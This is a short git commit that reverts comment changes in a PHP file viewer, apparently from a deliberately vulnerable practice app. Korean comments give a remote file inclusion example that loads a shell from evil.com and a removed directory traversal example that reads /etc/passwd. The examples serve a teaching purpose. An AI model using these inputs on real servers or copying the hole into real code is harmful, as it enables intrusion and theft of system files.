6c4beeba2eb3508a31f65a3c18c41b812858a19b
zithub0 <hoogleacount@gmail.com>
2025-08-12 02:28:30 +0900

    Revert: file_viewer.php and index.php changes

--- web/file_viewer.php
+++ web/file_viewer.php
@@ -12,7 +12,3 @@ if (isset($_GET['file'])) {
     // 공격 예시: /file_viewer.php?file=http://evil.com/shell.php
 }
 ?>
-
-// 디렉토리 트레버셜 공격 예시 1
-// http://localhost/file_viewer.php?file=../../../../../../etc/passwd
-// 해당 코드는 도커 안에 존재
